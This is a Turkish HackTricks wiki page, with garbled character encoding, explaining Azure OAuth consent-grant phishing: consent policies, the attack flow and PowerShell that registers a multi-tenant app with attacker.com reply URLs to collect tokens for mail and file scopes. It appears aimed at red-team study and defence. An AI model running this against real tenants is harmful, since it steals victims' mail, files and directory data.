# Az - Ä°zin Verme HakkÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## OAuth Uygulama Phishing

**Azure UygulamalarÄ±**, **kullanÄ±cÄ± verilerine** (temel bilgiler, belgeler, e-posta gÃ¶nderme vb.) eriÅŸim izni ister.\
EÄŸer **izin verilirse**, normal bir kullanÄ±cÄ± yalnÄ±zca **"DÃ¼ÅŸÃ¼k Etkili" izinler** iÃ§in onay verebilir. **DiÄŸer tÃ¼m** durumlarda, **yÃ¶netici onayÄ± gereklidir**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme yetkisi` iÃ§eren Ã¶zel bir rol, kiracÄ± genelinde onay verebilir.

Sadece **yÃ¶netici onayÄ± gerektirmeyen** izinler **dÃ¼ÅŸÃ¼k etki** olarak sÄ±nÄ±flandÄ±rÄ±lÄ±r. Bunlar, **temel oturum aÃ§ma iÃ§in gerekli olan** openid, profil, e-posta, User.Read ve offline\_access izinleridir. EÄŸer bir **kuruluÅŸ**, kullanÄ±cÄ± onayÄ±nÄ± **tÃ¼m uygulamalar iÃ§in** izin verirse, bir Ã§alÄ±ÅŸan bir uygulamaya **profilinden yukarÄ±dakileri okuma** izni verebilir.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Bu nedenle, bir saldÄ±rgan **kÃ¶tÃ¼ niyetli bir Uygulama** hazÄ±rlayabilir ve bir **phishing** ile kullanÄ±cÄ±nÄ±n **UygulamayÄ± kabul etmesini saÄŸlayarak verilerini Ã§alabilir**.

### 2 TÃ¼r Ä°zin Verme HakkÄ± SaldÄ±rÄ±larÄ±

* **Kimlik DoÄŸrulamasÄ± Olmayan**: DÄ±ÅŸ bir hesaptan `User.Read` ve `User.ReadBasic.All` izinleri ile bir uygulama oluÅŸturun, bir kullanÄ±cÄ±yÄ± phishing yapÄ±n ve dizin bilgilerine eriÅŸim saÄŸlayÄ±n.
* Bu, phishing yapÄ±lan kullanÄ±cÄ±nÄ±n dÄ±ÅŸ ortamlardan OAuth uygulamalarÄ±nÄ± kabul edebilmesini gerektirir!
* **Kimlik DoÄŸrulamalÄ±**: Yeterli ayrÄ±calÄ±klara sahip bir anahtarÄ± ele geÃ§irdikten sonra, hesap iÃ§inde bir uygulama oluÅŸturun ve ayrÄ±calÄ±klÄ± OAuth izinlerini kabul edebilecek bazÄ± ayrÄ±calÄ±klÄ± kullanÄ±cÄ±larÄ± phishing yapÄ±n.
* Bu durumda, dizin bilgilerine zaten eriÅŸiminiz var, bu nedenle `User.ReadBasic.All` izni artÄ±k ilginÃ§ deÄŸildir.
* **YÃ¶netici onayÄ± gerektiren izinlerle** ilgileniyor olabilirsiniz, Ã§Ã¼nkÃ¼ sÄ±radan bir kullanÄ±cÄ± OAuth uygulamalarÄ±na herhangi bir izin veremez, bu yÃ¼zden yalnÄ±zca **bu kullanÄ±cÄ±larÄ± phishing yapmanÄ±z gerekir** (bu ayrÄ±calÄ±ÄŸÄ± veren roller/izinler hakkÄ±nda daha fazla bilgi daha sonra).

### KullanÄ±cÄ±larÄ±n onay vermeye izin verip vermediÄŸini kontrol etme

AÅŸaÄŸÄ±daki PowerShell komutu, Azure Active Directory (Azure AD) iÃ§indeki kullanÄ±cÄ±larÄ±n uygulamalara onay verme yetenekleriyle ilgili onay yapÄ±landÄ±rmasÄ±nÄ± kontrol etmek iÃ§in kullanÄ±lÄ±r:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **KullanÄ±cÄ± onayÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak**: Bu ayar, kullanÄ±cÄ±larÄ±n uygulamalara izin vermesini yasaklar. Uygulamalara kullanÄ±cÄ± onayÄ± verilmesine izin verilmez.
* **KullanÄ±cÄ±lar, yalnÄ±zca seÃ§tiÄŸiniz izinler iÃ§in doÄŸrulanmÄ±ÅŸ yayÄ±ncÄ±lardan veya kendi organizasyonunuzdan uygulamalara onay verebilir**: Bu ayar, tÃ¼m kullanÄ±cÄ±larÄ±n yalnÄ±zca doÄŸrulanmÄ±ÅŸ bir yayÄ±ncÄ± tarafÄ±ndan yayÄ±mlanan ve kendi kiracÄ±nÄ±zda kayÄ±tlÄ± uygulamalara onay vermesine izin verir. Belirli izinler iÃ§in yalnÄ±zca onay vermeye izin vererek bir kontrol katmanÄ± ekler.
* **KullanÄ±cÄ±lar tÃ¼m uygulamalara onay verebilir**: Bu ayar daha izin vericidir ve tÃ¼m kullanÄ±cÄ±larÄ±n, bu izinlerin yÃ¶netim onayÄ± gerektirmediÄŸi sÃ¼rece, uygulamalar iÃ§in herhangi bir izne onay vermesine izin verir.
* **Ã–zel uygulama onay politikasÄ±**: Bu ayar, belirli organizasyonel gereksinimlere gÃ¶re Ã¶zelleÅŸtirilebilen ve uygulama yayÄ±ncÄ±sÄ±na, uygulamanÄ±n talep ettiÄŸi izinlere ve diÄŸer faktÃ¶rlere dayanan bir dizi kÄ±sÄ±tlama iÃ§erebilecek Ã¶zel bir politikanÄ±n mevcut olduÄŸunu gÃ¶sterir.

## **Yasa DÄ±ÅŸÄ± Onay Verme SaldÄ±rÄ±sÄ±nÄ± Anlamak**

Yasa dÄ±ÅŸÄ± onay verme saldÄ±rÄ±sÄ±nda, saldÄ±rganlar son kullanÄ±cÄ±larÄ± Azure'da kayÄ±tlÄ± kÃ¶tÃ¼ niyetli bir uygulamaya izin vermeye kandÄ±rÄ±r. Bu, uygulamanÄ±n meÅŸru gÃ¶rÃ¼nmesini saÄŸlayarak, kurbanlarÄ±n "Kabul Et" butonuna bilmeden tÄ±klamasÄ±na yol aÃ§ar. SonuÃ§ olarak, Azure AD, saldÄ±rganÄ±n sitesine bir token verir ve bu da onlara kurbanÄ±n verilerine eriÅŸim ve manipÃ¼lasyon yapma imkanÄ± tanÄ±r; Ã¶rneÄŸin, e-postalarÄ± okuma veya gÃ¶nderme ve dosyalara eriÅŸme gibi, organizasyonel bir hesaba ihtiyaÃ§ duymadan.

## **SaldÄ±rÄ± AkÄ±ÅŸÄ±nÄ±n Genel GÃ¶rÃ¼nÃ¼mÃ¼**

SaldÄ±rÄ±, genel bir ÅŸirketi hedef alan birkaÃ§ adÄ±m iÃ§erir. Ä°ÅŸte nasÄ±l geliÅŸebileceÄŸi:

1. **Alan AdÄ± KaydÄ± ve Uygulama BarÄ±ndÄ±rma**: SaldÄ±rgan, gÃ¼venilir bir siteye benzeyen bir alan adÄ± kaydeder, Ã¶rneÄŸin "safedomainlogin.com". Bu alan adÄ± altÄ±nda, yetkilendirme kodlarÄ±nÄ± yakalamak ve eriÅŸim tokenlarÄ± talep etmek iÃ§in tasarlanmÄ±ÅŸ bir uygulamayÄ± barÄ±ndÄ±rmak Ã¼zere bir alt alan adÄ± oluÅŸturulur (Ã¶rneÄŸin, "companyname.safedomainlogin.com").
2. **Azure AD'de Uygulama KaydÄ±**: SaldÄ±rgan, hedef ÅŸirketin adÄ±nÄ± kullanarak meÅŸru gÃ¶rÃ¼nmesi iÃ§in Azure AD KiracÄ±sÄ±nda Ã‡oklu KiracÄ± UygulamasÄ± kaydeder. UygulamanÄ±n YÃ¶nlendirme URL'sini kÃ¶tÃ¼ niyetli uygulamayÄ± barÄ±ndÄ±ran alt alan adÄ±na yÃ¶nlendirecek ÅŸekilde yapÄ±landÄ±rÄ±r.
3. **Ä°zinlerin AyarlanmasÄ±**: SaldÄ±rgan, uygulamayÄ± Ã§eÅŸitli API izinleriyle (Ã¶rneÄŸin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) ayarlar. Bu izinler, kullanÄ±cÄ± tarafÄ±ndan verildiÄŸinde, saldÄ±rgana kullanÄ±cÄ±nÄ±n adÄ±na hassas bilgileri Ã§Ä±karmasÄ±na olanak tanÄ±r.
4. **KÃ¶tÃ¼ Niyetli BaÄŸlantÄ±larÄ±n DaÄŸÄ±tÄ±lmasÄ±**: SaldÄ±rgan, kÃ¶tÃ¼ niyetli uygulamanÄ±n istemci kimliÄŸini iÃ§eren bir baÄŸlantÄ± hazÄ±rlar ve bunu hedeflenen kullanÄ±cÄ±lara paylaÅŸarak onlarÄ± onay vermeye kandÄ±rÄ±r.

## **SaldÄ±rÄ± Ä°Ã§in AraÃ§larÄ±n KullanÄ±mÄ±**

SaldÄ±rÄ±, [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) gibi araÃ§lar kullanÄ±larak kolaylaÅŸtÄ±rÄ±labilir.

### SaldÄ±rÄ± Ã–ncesi HazÄ±rlÄ±k:

EÄŸer saldÄ±rgan, kurban organizasyondaki bir kullanÄ±cÄ±ya belirli bir eriÅŸim seviyesine sahipse, organizasyonun politikasÄ±nÄ±n kullanÄ±cÄ±nÄ±n uygulamalarÄ± kabul etmesine izin verip vermediÄŸini kontrol edebilir:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
SaldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rganÄ±n **Azure KiracÄ±sÄ±nda yeni bir Uygulama oluÅŸturmasÄ±** gerekecek (Uygulama kayÄ±tlarÄ±nda), izinlerle yapÄ±landÄ±rÄ±lmÄ±ÅŸ:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`, `Delegated permissions` altÄ±nda `Microsoft Graph` iÃ§indedir. (Uygulama izinleri her zaman ek onay gerektirecektir).

* `User.ReadBasic.All`, eÄŸer verilirse, **kurumdaki tÃ¼m kullanÄ±cÄ±larÄ±n bilgilerini okumanÄ±za** izin verecek izindir.
* Sadece `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `izinleri uygulamalara verme izni` iÃ§eren Ã¶zel bir rol, kiracÄ± genelinde onay verebilir. Bu nedenle, **yÃ¶netici onayÄ± gerektiren bir UygulamayÄ± onaylatmak istiyorsanÄ±z, bu rollerden biriyle bir kullanÄ±cÄ±yÄ± oltalamalÄ±sÄ±nÄ±z**.

AyrÄ±ca, cli aracÄ±lÄ±ÄŸÄ±yla bir Uygulama oluÅŸturabilirsiniz: 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresini kontrol edin ve nasÄ±l yapÄ±landÄ±rÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenin.

{% hint style="warning" %}
Elde edilen **eriÅŸim jetonu** **graph endpoint** iÃ§in `User.Read` ve `User.ReadBasic.All` (istenen izinler) kapsamlarÄ± ile olacaktÄ±r. DiÄŸer eylemleri gerÃ§ekleÅŸtiremeyeceksiniz (ancak bunlar org'daki **tÃ¼m kullanÄ±cÄ±lar hakkÄ±nda bilgi indirmek iÃ§in yeterlidir**).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Bu aracÄ± bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in de kullanabilirsiniz.

## Post-Exploitation

KullanÄ±cÄ±ya eriÅŸim saÄŸladÄ±ktan sonra, hassas belgeleri Ã§almak ve hatta arka kapÄ±lÄ± belge dosyalarÄ± yÃ¼klemek gibi ÅŸeyler yapabilirsiniz.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
